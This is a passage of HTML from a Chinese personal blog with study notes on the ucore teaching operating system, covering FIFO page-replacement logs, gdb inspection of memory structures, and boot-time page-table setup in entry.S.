class="built_in"> page </span><span class="keyword">in</span> vaddr 0x4000 <span class="keyword">to</span> disk swap entry 5</span><br><span class="line">swap_in: load disk swap entry 4 with swap_page <span class="keyword">in</span> vadr 0x3000</span><br><span class="line">write Virt<span class="built_in"> Page </span>d <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">page fault at 0x00004000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">*ptep!=0</span><br><span class="line">swap_out: i 0, store<span class="built_in"> page </span><span class="keyword">in</span> vaddr 0x5000 <span class="keyword">to</span> disk swap entry 6</span><br><span class="line">swap_in: load disk swap entry 5 with swap_page <span class="keyword">in</span> vadr 0x4000</span><br><span class="line">write Virt<span class="built_in"> Page </span>e <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">page fault at 0x00005000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">*ptep!=0</span><br><span class="line">swap_out: i 0, store<span class="built_in"> page </span><span class="keyword">in</span> vaddr 0x1000 <span class="keyword">to</span> disk swap entry 2</span><br><span class="line">swap_in: load disk swap entry 6 with swap_page <span class="keyword">in</span> vadr 0x5000</span><br><span class="line">write Virt<span class="built_in"> Page </span>a <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">page fault at 0x00001000: K/R [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">swap_out: i 0, store<span class="built_in"> page </span><span class="keyword">in</span> vaddr 0x2000 <span class="keyword">to</span> disk swap entry 3</span><br><span class="line">swap_in: load disk swap entry 2 with swap_page <span class="keyword">in</span> vadr 0x1000</span><br><span class="line">count is 0, total is 7</span><br></pre></td></tr></table></figure>
<p>&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x7A0B;&#x5E8F;&#x8981;&#x5BF9;0x00005000&#x8FDB;&#x884C;&#x5199;&#x65F6;&#x51FA;&#x73B0;&#x7F3A;&#x9875;&#x4E2D;&#x65AD;&#xFF0C;&#x4F46;&#x662F;&#x7269;&#x7406;&#x9875;&#x5DF2;&#x7ECF;&#x6EE1;&#x4E86;&#xFF0C;&#x5C31;&#x628A;0x00001000&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406;&#x9875;&#x7F6E;&#x6362;&#x5230;swap&#x533A;&#x2026;&#x2026;</p>
<p>&#x6700;&#x540E;12&#x6B21;&#x5199;&#x4E2D;&#xFF0C;&#x53D1;&#x751F;&#x4E86;7&#x6B21;&#x7F3A;&#x9875;&#x5F02;&#x5E38;&#x3002;</p>
<h2 id="&#x5176;&#x4ED6;"><a href="#&#x5176;&#x4ED6;" class="headerlink" title="&#x5176;&#x4ED6;"></a>&#x5176;&#x4ED6;</h2><h3 id="&#x4F7F;&#x7528;gdb&#x67E5;&#x770B;mm-struct-&#x548C;-vma-struct-&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5185;&#x5BB9;"><a href="#&#x4F7F;&#x7528;gdb&#x67E5;&#x770B;mm-struct-&#x548C;-vma-struct-&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5185;&#x5BB9;" class="headerlink" title="&#x4F7F;&#x7528;gdb&#x67E5;&#x770B;mm_struct &#x548C; vma_struct &#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5185;&#x5BB9;"></a>&#x4F7F;&#x7528;gdb&#x67E5;&#x770B;mm_struct &#x548C; vma_struct &#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5185;&#x5BB9;</h3><p>&#x67E5;&#x770B; mm_struct &#x548C; vma_struct &#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x521D;&#x59CB;&#x65F6;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x9875;&#x76EE;&#x5F55;&#x8868;&#x9879;&#xFF0C;&#x7EF4;&#x62A4;&#x4E86;&#x4E00;&#x4E2A;&#x9875;&#x8868;&#xFF0C;&#x8BE5;&#x9875;&#x8868;&#x7EF4;&#x62A4;&#x4E86;0~4M&#x7684;&#x865A;&#x62DF;&#x5185;&#x5B58;&#x7A7A;&#x95F4;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">gef&#x27A4;  p check_mm_struct</span><br><span class="line">$<span class="number">3</span> = (struct mm_struct *) <span class="number">0xc0303000</span></span><br><span class="line">  </span><br><span class="line">gef&#x27A4;  p *((struct mm_struct *) <span class="number">0xc0303000</span>)</span><br><span class="line">$<span class="number">12</span> = {</span><br><span class="line">  mmap_list = {</span><br><span class="line">    prev = <span class="number">0xc0304010</span>, </span><br><span class="line">    next = <span class="number">0xc0304010</span></span><br><span class="line">  }, </span><br><span class="line">  mmap_cache = <span class="number">0xc0304000</span>, </span><br><span class="line">  pgdir = <span class="number">0xc0120000</span>, </span><br><span class="line">  map_count = <span class="number">0x1</span>, </span><br><span class="line">  sm_priv = <span class="number">0x0</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">gef&#x27A4;  p *((struct vma_struct *) (<span class="number">0xc0304010</span><span class="number">-0x10</span>))</span><br><span class="line">$<span class="number">13</span> = {</span><br><span class="line">  vm_mm = <span class="number">0xc0303000</span>, </span><br><span class="line">  vm_start = <span class="number">0x0</span>, </span><br><span class="line">  vm_end = <span class="number">0x400000</span>, </span><br><span class="line">  vm_flags = <span class="number">0x2</span>, </span><br><span class="line">  list_link = {</span><br><span class="line">    prev = <span class="number">0xc0303000</span>, </span><br><span class="line">    next = <span class="number">0xc0303000</span></span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&#x67E5;&#x770B;&#x9875;&#x8868;&#x5185;&#x5BB9;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x9875;&#x8868;&#x4E2D;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x6620;&#x5C04;</span><br><span class="line">gef&#x27A4;  x/<span class="number">4</span>xw <span class="number">0xc0120000</span></span><br><span class="line"><span class="number">0xc0120000</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<h3 id="&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#x5206;&#x7C7B;"><a href="#&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#x5206;&#x7C7B;" class="headerlink" title="&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#x5206;&#x7C7B;"></a>&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#x5206;&#x7C7B;</h3><p>&#x5C40;&#x90E8;&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#xFF1A;1.&#x6700;&#x4F18;&#x7B97;&#x6CD5; 2.FIFO&#x7B97;&#x6CD5; 3.&#x6700;&#x8FD1;&#x6700;&#x4E45;&#x672A;&#x4F7F;&#x7528;&#x7B97;&#x6CD5; 4.&#x65F6;&#x949F;&#x7F6E;&#x6362;&#x7B97;&#x6CD5; 5.&#x6700;&#x4E0D;&#x5E38;&#x7528;&#x7B97;&#x6CD5;</p>
<p>&#x5168;&#x5C40;&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#xFF1A;1.&#x5DE5;&#x4F5C;&#x96C6;&#x7F6E;&#x6362;&#x7B97;&#x6CD5; 2.&#x7F3A;&#x9875;&#x7387;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;</p>
<h3 id="&#x5C40;&#x90E8;&#x6027;&#x539F;&#x7406;"><a href="#&#x5C40;&#x90E8;&#x6027;&#x539F;&#x7406;" class="headerlink" title="&#x5C40;&#x90E8;&#x6027;&#x539F;&#x7406;"></a>&#x5C40;&#x90E8;&#x6027;&#x539F;&#x7406;</h3><p>&#x7A0B;&#x5E8F;&#x5728;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x8F83;&#x77ED;&#x7684;&#x65F6;&#x671F;&#x5185;&#xFF0C;&#x6240;&#x6267;&#x884C;&#x7684;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x548C;&#x6307;&#x4EE4;&#x64CD;&#x4F5C;&#x6570;&#x5730;&#x5740;&#xFF0C;&#x5206;&#x522B;&#x5C40;&#x9650;&#x4E8E;&#x4E00;&#x5B9A;&#x533A;&#x57DF;&#xFF0C;&#x5305;&#x62EC;&#x65F6;&#x95F4;&#x5C40;&#x90E8;&#x6027;&#x3001;&#x7A7A;&#x95F4;&#x5C40;&#x90E8;&#x6027;&#x3001;&#x5206;&#x652F;&#x5C40;&#x90E8;&#x6027;</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/03/mineucore-物理内存管理学习笔记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Po1lux">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/IMG.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Po1lux's Diary">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/03/mineucore-物理内存管理学习笔记/" itemprop="url">mineucore-物理内存管理学习笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-03T21:56:48+08:00">
                2019-10-03
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/10/03/mineucore-物理内存管理学习笔记/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/10/03/mineucore-物理内存管理学习笔记/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2019/10/03/mineucore-物理内存管理学习笔记/" class="leancloud_visitors" data-flag-title="mineucore-物理内存管理学习笔记">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x5B9E;&#x73B0;&#x9AD8;&#x5EA6;&#x4F9D;&#x8D56;&#x786C;&#x4EF6;&#xFF0C;&#x6BD4;&#x5982;MMU&#xFF1A;&#x5904;&#x7406;CPU&#x5B58;&#x50A8;&#x8BBF;&#x95EE;&#x8BF7;&#x6C42;&#x7684;&#x786C;&#x4EF6;&#x3002;&#x76EE;&#x524D;&#x5927;&#x591A;&#x6570;&#x7CFB;&#x7EDF;&#xFF0C;&#x5982;linux&#xFF0C;&#x5747;&#x91C7;&#x7528;&#x6309;&#x9700;&#x865A;&#x62DF;&#x9875;&#x5F0F;&#x5B58;&#x50A8;&#xFF0C;<strong>&#x7269;&#x7406;&#x5730;&#x5740;&#x7A7A;&#x95F4;</strong>&#x662F;&#x6307;&#x786C;&#x4EF6;&#x652F;&#x6301;&#x7684;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#xFF0C;<strong>&#x903B;&#x8F91;&#x5730;&#x5740;&#x7A7A;&#x95F4;</strong>&#x662F;&#x6307;CPU&#x8FD0;&#x884C;&#x7684;&#x8FDB;&#x7A0B;&#x770B;&#x5230;&#x7684;&#x5730;&#x5740;</p>
<h2 id="0x00-bootloader&#x63A2;&#x6D4B;&#x771F;&#x5B9E;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#xFF08;bootasm-S&#xFF09;"><a href="#0x00-bootloader&#x63A2;&#x6D4B;&#x771F;&#x5B9E;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#xFF08;bootasm-S&#xFF09;" class="headerlink" title="0x00 bootloader&#x63A2;&#x6D4B;&#x771F;&#x5B9E;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#xFF08;bootasm.S&#xFF09;"></a>0x00 bootloader&#x63A2;&#x6D4B;&#x771F;&#x5B9E;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#xFF08;bootasm.S&#xFF09;</h2><p>bootloader&#x901A;&#x8FC7;INT 15h&#x4E2D;&#x65AD;&#xFF0C;&#x4E2D;&#x65AD;&#x53F7;&#x4E3A;e820h&#xFF0C;&#x83B7;&#x53D6;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x5185;&#x5B58;&#x4FE1;&#x606F;&#xFF0C;&#x5C06;&#x6570;&#x636E;&#x6309;struct e820map&#x7684;&#x683C;&#x5F0F;&#x4FDD;&#x5B58;&#x5728;&#x865A;&#x62DF;&#x7A7A;&#x95F4;&#x7684;0xc0000000+0x8000&#x5904;</p>
<h2 id="0x01-&#x4F7F;&#x80FD;&#x6BB5;&#x9875;&#x5F0F;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x673A;&#x5236;&#x7684;&#x8BBE;&#x8BA1;&#x65B9;&#x6848;&#xFF08;entry-S&#xFF09;"><a href="#0x01-&#x4F7F;&#x80FD;&#x6BB5;&#x9875;&#x5F0F;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x673A;&#x5236;&#x7684;&#x8BBE;&#x8BA1;&#x65B9;&#x6848;&#xFF08;entry-S&#xFF09;" class="headerlink" title="0x01 &#x4F7F;&#x80FD;&#x6BB5;&#x9875;&#x5F0F;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x673A;&#x5236;&#x7684;&#x8BBE;&#x8BA1;&#x65B9;&#x6848;&#xFF08;entry.S&#xFF09;"></a>0x01 &#x4F7F;&#x80FD;&#x6BB5;&#x9875;&#x5F0F;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x673A;&#x5236;&#x7684;&#x8BBE;&#x8BA1;&#x65B9;&#x6848;&#xFF08;entry.S&#xFF09;</h2><p>&#x60F3;&#x8981;&#x6700;&#x7EC8;&#x5B9E;&#x73B0;&#x7684;&#x6BB5;&#x9875;&#x5F0F;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x662F;&#xFF1A;</p>
<p>Virtual Address = Linear Address = Pythal Address + 0xC0000000</p>
<p>&#x5B9E;&#x6A21;&#x5F0F;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x662F;&#x6CA1;&#x6709;&#x9875;&#x673A;&#x5236;&#x7684;&#xFF0C;ld&#x5728;&#x94FE;&#x63A5;&#x9636;&#x6BB5;&#x751F;&#x6210;&#x4E86;ucore&#x7684;&#x865A;&#x62DF;&#x5730;&#x5740;&#xFF0C;&#x662F;0xc0100000&#xFF0C;&#x4F46;&#x662F;ucore&#x9700;&#x8981;&#x8FD0;&#x884C;&#x5728;&#x4F4E;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x4ECE;&#x8BA1;&#x7B97;&#x673A;&#x52A0;&#x7535;&#x5230;&#x542F;&#x52A8;&#x6BB5;&#x9875;&#x5F0F;&#x7BA1;&#x7406;&#xFF0C;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x53D1;&#x751F;&#x4E86;&#x591A;&#x6B21;&#x7684;&#x53D8;&#x5316;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x4E09;&#x4E2A;&#x9636;&#x6BB5;&#x53BB;&#x5B9E;&#x73B0;&#x8FD9;&#x4E2A;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#xFF1A;</p>
<h3 id="&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#xFF08;&#x5F00;&#x542F;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;&#xFF0C;&#x521B;&#x5EFA;&#x542F;&#x52A8;&#x6BB5;&#x8868;&#xFF09;"><a href="#&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#xFF08;&#x5F00;&#x542F;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;&#xFF0C;&#x521B;&#x5EFA;&#x542F;&#x52A8;&#x6BB5;&#x8868;&#xFF09;" class="headerlink" title="&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#xFF08;&#x5F00;&#x542F;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;&#xFF0C;&#x521B;&#x5EFA;&#x542F;&#x52A8;&#x6BB5;&#x8868;&#xFF09;"></a>&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#xFF08;&#x5F00;&#x542F;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;&#xFF0C;&#x521B;&#x5EFA;&#x542F;&#x52A8;&#x6BB5;&#x8868;&#xFF09;</h3><p>&#x8BE5;&#x9636;&#x6BB5;&#x662F;bootloader&#x9636;&#x6BB5;&#xFF0C;&#x6B64;&#x65F6;cpu&#x662F;&#x5B9E;&#x6A21;&#x5F0F;&#xFF0C;&#x6240;&#x4EE5;&#x5730;&#x5740;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x5982;&#x4E0B;&#xFF1A;<br>Virtual Address = Linear Address = Pythal Address<br>&#x867D;&#x7136;ld&#x94FE;&#x63A5;&#x6587;&#x4EF6;&#x8BF4;&#x660E;&#x4E86;ucore&#x5185;&#x6838;&#x7684;&#x88C5;&#x8F7D;&#x7A7A;&#x95F4;&#x662F;0xC0100000&#xFF0C;&#x4F46;&#x662F;bootloader&#x4F1A;&#x5C06;ucore&#x88C5;&#x8F7D;&#x5230;0x100000&#x4E2D;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readseg(ph-&gt;p_va &amp; <span class="number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br></pre></td></tr></table></figure>
<h3 id="&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF08;&#x521B;&#x5EFA;&#x521D;&#x59CB;&#x9875;&#x76EE;&#x5F55;&#x8868;&#xFF0C;&#x5F00;&#x542F;&#x5206;&#x9875;&#x6A21;&#x5F0F;&#xFF09;"><a href="#&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF08;&#x521B;&#x5EFA;&#x521D;&#x59CB;&#x9875;&#x76EE;&#x5F55;&#x8868;&#xFF0C;&#x5F00;&#x542F;&#x5206;&#x9875;&#x6A21;&#x5F0F;&#xFF09;" class="headerlink" title="&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF08;&#x521B;&#x5EFA;&#x521D;&#x59CB;&#x9875;&#x76EE;&#x5F55;&#x8868;&#xFF0C;&#x5F00;&#x542F;&#x5206;&#x9875;&#x6A21;&#x5F0F;&#xFF09;"></a>&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF08;&#x521B;&#x5EFA;&#x521D;&#x59CB;&#x9875;&#x76EE;&#x5F55;&#x8868;&#xFF0C;&#x5F00;&#x542F;&#x5206;&#x9875;&#x6A21;&#x5F0F;&#xFF09;</h3><p>&#x5728;entry.S&#x7684;kern_entry&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x521D;&#x59CB;&#x5316;&#x4E86;&#x4E00;&#x4E2A;&#x4E34;&#x65F6;&#x9875;&#x76EE;&#x5F55;&#x8868;&#x548C;&#x9875;&#x8868;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kern_entry:</span><br><span class="line">    # load pa of boot pgdir</span><br><span class="line">    movl $REALLOC(__boot_pgdir), %eax</span><br><span class="line">    movl %eax, %cr3</span><br><span class="line">......</span><br><span class="line">__boot_pgdir:</span><br><span class="line">.globl __boot_pgdir</span><br><span class="line">    # map va 0 ~ 4M to pa 0 ~ 4M (temporary)</span><br><span class="line">    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)</span><br><span class="line">    .space (KERNBASE &gt;&gt; PGSHIFT &gt;&gt; 10 &lt;&lt; 2) - (. - __boot_pgdir) # pad to PDE of KERNBASE</span><br><span class="line">    # map va KERNBASE + (0 ~ 4M) to pa 0 ~ 4M</span><br><span class="line">    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)</span><br><span class="line">    .space PGSIZE - (. - __boot_pgdir) # pad to PGSIZE</span><br><span class="line"></span><br><span class="line">.set i, 0</span><br><span class="line">__boot_pt1:</span><br><span class="line">.rept 1024</span><br><span class="line">    .long i * PGSIZE + (PTE_P | PTE_W)</span><br><span class="line">    .set i, i + 1</span><br><span class="line">.endr</span><br></pre></td></tr></table></figure>
<p>&#x89E3;&#x91CA;&#x4E0B;&#x4E34;&#x65F6;&#x6620;&#x5C04;&#x7684;&#x5EFA;&#x7ACB;&#xFF1A;&#x7B2C;9&#x5230;&#x7B2C;13&#x884C;<br>&#x7B2C;&#x4E00;&#x53E5;&#xFF0C;&#x5C06;&#x9875;&#x8868;&#x7684;&#x7269;&#x7406;&#x5730;&#x5740;&#x586B;&#x5165;&#x9875;&#x76EE;&#x5F55;&#x8868;&#x7684;&#x7B2C;&#x4E00;&#x9879;&#xFF0C;&#x5B9E;&#x73B0;map va 0 ~ 4M to pa 0 ~ 4M<br><code>.space    &#x7A7A;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x540E;&#x9762;&#x8DDF;&#x6570;&#x91CF;    .space 4</code><br>&#x7B2C;&#x4E8C;&#x53E5;&#xFF0C;&#x586B;&#x5145;&#x9875;&#x76EE;&#x5F55;&#x8868;&#xFF0C;&#x586B;&#x5230;0xc0000000&#x90A3;&#x9879;&#xFF0C;KERNBASE  = 0xc0000000&#xFF0C;PGSHIFT = 12&#xFF0C;&#x5411;&#x53F3;&#x79FB;12&#x4F4D;&#xFF0C;&#x63A5;&#x7740;&#x5411;&#x53F3;&#x79FB;10&#x4F4D;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x88AB;4K*1k&#xFF08;4M&#xFF09;&#x9664;&#xFF0C;&#x56E0;&#x4E3A;&#x9875;&#x76EE;&#x5F55;&#x8868;&#x9879;&#x4E00;&#x9879;&#x6620;&#x5C04;&#x7684;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#x662F;4M&#xFF0C;&#x7136;&#x540E;&#x5DE6;&#x79FB;&#x4E24;&#x4F4D;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x4E58;4&#xFF0C;&#x56E0;&#x4E3A;&#x6BCF;&#x4E00;&#x9879;&#x5360;4&#x5B57;&#x8282;&#xFF0C;&#x7136;&#x540E;&#x51CF;&#x53BB;&#xFF08;&#x5F53;&#x524D;&#x5730;&#x5740;&#x51CF;&#x9875;&#x76EE;&#x5F55;&#x8868;&#x7684;&#x5730;&#x5740;&#xFF09;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x51CF;&#x53BB;&#x9875;&#x76EE;&#x5F55;&#x8868;&#x7B2C;&#x4E00;&#x9879;&#x7684;&#x5730;&#x5740;<br>&#x7B2C;&#x4E09;&#x53E5;&#xFF0C;&#x5B8C;&#x6210;map va KERNBASE + (0 ~ 4M) to pa 0 ~ 4M<br>&#x7B2C;&#x56DB;&#x53E5;&#xFF0C;&#x5C06;&#x9875;&#x76EE;&#x5F55;4K&#x5BF9;&#x9F50;</p>
<p>&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x4E3A;&#xFF1A;<br>Virtual Address = Linear Address = Pythal Address&#xFF08;0~4M&#x7684;&#x7EBF;&#x6027;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#xFF09;<br>Virtual Address = Linear Address = Pythal Address + 0xC0000000&#xFF08;0xC0000000~0xC0000000+4M&#x7684;&#x7EBF;&#x6027;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#xFF09;</p>
<blockquote>
<p><strong>&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8FD9;&#x6837;&#x6620;&#x5C04;&#x5462;&#xFF1F;</strong><br>ucore&#x6B64;&#x65F6;&#x5728;0~4M&#x7684;&#x4F4E;&#x865A;&#x62DF;&#x5730;&#x5740;&#x533A;&#x57DF;&#x8FD0;&#x884C;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x4F7F;&#x80FD;&#x6BB5;&#x9875;&#x673A;&#x5236;&#x540E;ucore&#x80FD;&#x591F;&#x6B63;&#x5E38;&#x8FD0;&#x884C;&#xFF0C;&#x6240;&#x4EE5;&#x6DFB;&#x52A0;&#x4E86;<code>Virtual Address = Linear Address = Pythal Address&#xFF08;0~4M&#x7684;&#x7EBF;&#x6027;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#xFF09;</code>&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;</p>
</blockquote>
<p>&#x63A5;&#x4E0B;&#x6765;&#x8C03;&#x6574;&#x5185;&#x6838;&#x7684;EIP&#x5230;&#x9AD8;&#x865A;&#x62DF;&#x5730;&#x5740;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    # update eip</span><br><span class="line">    # now, eip = 0x1.....</span><br><span class="line">    leal next, %eax</span><br><span class="line">    # set eip = KERNBASE + 0x1.....</span><br><span class="line">    jmp *%eax</span><br><span class="line">next:</span><br></pre></td></tr></table></figure>
<p>&#x7136;&#x540E;&#x6E05;&#x9664;&#xFF08;0~4M&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#xFF09;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># unmap va 0 ~ 4M, it&apos;s temporary mapping</span><br><span class="line">xorl %eax, %eax</span><br><span class="line">movl %eax, __boot_pgdir</span><br></pre></td></tr></table></figure>
<p>&#x6B64;&#x65F6;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x5C31;&#x53EA;&#x6709;&#xFF1A;<br>Virtual Address = Linear Address = Pythal Address + 0xC0000000&#xFF08;0xC0000000~0xC0000000+4M&#x7684;&#x7EBF;&#x6027;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#xFF09;</p>
<h3 id="&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#xFF08;&#x5B8C;&#x5584;&#x6BB5;&#x8868;&#x548C;&#x9875;&#x8868;&#xFF09;"><a href="#&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#xFF08;&#x5B8C;&#x5584;&#x6BB5;&#x8868;&#x548C;&#x9875;&#x8868;&#xFF09;" class="headerlink" title="&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#xFF08;&#x5B8C;&#x5584;&#x6BB5;&#x8868;&#x548C;&#x9875;&#x8868;&#xFF09;"></a>&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#xFF08;&#x5B8C;&#x5584;&#x6BB5;&#x8868;&#x548C;&#x9875;&#x8868;&#xFF09;</h3><p>&#x5C06;&#x9875;&#x76EE;&#x5F55;&#x8868;&#x4ECE;&#xFF08;0~4M&#x6269;&#x5145;&#x5230;0~KMEMSIZE&#xFF09;<br>&#x6700;&#x540E;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x4E3A;&#xFF1A;</p>
<p>Virtual Address = Linear Address = Pythal Address + 0xC0000000</p>
